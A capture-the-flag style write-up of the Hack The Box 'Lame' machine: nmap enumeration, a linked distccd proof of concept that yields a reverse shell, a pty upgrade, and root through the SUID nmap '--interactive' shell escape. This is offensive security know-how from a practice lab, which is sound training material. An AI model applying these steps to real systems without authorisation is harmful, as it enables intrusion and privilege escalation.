---
hidden: true
---

# Lame Write-Up - HTB

Related articles: Tags: #write-ups

***

Target\_IP: 10.10.10.3

## ENUMERATION:



```bash
nmap -sS -p- -Pn -n --disable-arp-ping -oA Lame 10.10.10.3
```

<pre class="language-bash"><code class="lang-bash"><strong>Nmap 7.94SVN scan initiated Fri Aug 23 08:53:49 2024 as:
</strong>Nmap scan report for 10.10.10.3
Host is up (0.032s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

# Nmap done at Fri Aug 23 08:55:35 2024 -- 1 IP address (1 host up) scanned in 106.35 seconds
</code></pre>

Then I tailored my scan based on the opened ports:

```bash
sudo nmap -sVC -Pn -n --disable-arp-ping -p21,22,139,445,3632 10.10.10.3
```

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-23 11:35 EDT
Nmap scan report for 10.10.10.3
Host is up (0.061s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-08-23T11:35:59-04:00
|_clock-skew: mean: 2h00m23s, deviation: 2h49m44s, median: 21s
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.38 seconds
                                                               
```

Nothing to be found in the ftp directory.&#x20;

<div align="left"><figure><img src="../.gitbook/assets/image (145).png" alt="" width="362"><figcaption></figcaption></figure></div>

I then checked the smb shares, but nothing useful neither...&#x20;

<div align="left"><figure><img src="../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure></div>

If we google exploits for the version of the vsftpd, smb we will find some, but we will also for distccd port 3632.

## FOOTHOLDING:

So, I decided to go with this [PoC](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855)

<figure><img src="../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

Got my reverse shell:  Upgraded it via:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

<div align="left"><figure><img src="../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure></div>

## Privilege Escalation:

Then I started to check for PrivEsc posibilities:

```bash
find / -perm /4000 2>/dev/null
```

So I found nmap:&#x20;

<div align="left"><figure><img src="../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure></div>

Let's abuse the SUID for NMAP:

```bash
nmap --interactive
```

<div align="left"><figure><img src="../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure></div>

Now do:

```bash
!/bin/sh
```

Voila! We got root :)&#x20;

<div align="left"><figure><img src="../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure></div>
